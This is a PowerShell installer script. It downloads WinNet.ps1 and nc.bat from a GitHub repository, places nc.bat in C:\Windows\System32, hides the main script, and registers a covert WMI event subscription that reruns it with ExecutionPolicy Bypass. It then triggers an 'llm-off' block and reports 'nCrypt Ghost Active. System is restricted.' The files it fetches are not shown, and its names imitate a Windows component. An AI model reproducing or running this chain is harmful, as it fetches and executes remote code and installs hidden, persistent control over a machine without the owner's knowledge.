# 1. Setup Folders
$dir = "C:\ProgramData\WinNetVerify"
if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force }

# 2. Download Files from your GitHub
$repo = "https://raw.githubusercontent.com/SunTzv/WinNetVerify/main"
iwr -Uri "$repo/WinNet.ps1" -OutFile "$dir\WinNet.ps1"
iwr -Uri "$repo/nc.bat" -OutFile "C:\Windows\System32\nc.bat"

# 3. Hide the Engine
attrib +s +h "$dir\WinNet.ps1"

# 4. Create WMI Ghost Persistence (Triggers 60s after boot)
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "WinNetVerifyFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
}

$CommandLine = "powershell.exe -ExecutionPolicy Bypass -File $dir\WinNet.ps1 off"
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "WinNetVerifyConsumer"
    CommandLineTemplate = $CommandLine
}

Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}

# 5. Run the block immediately
& "C:\Windows\System32\nc.bat" llm-off
Write-Host "[!] nCrypt Ghost Active. System is restricted." -ForegroundColor Cyan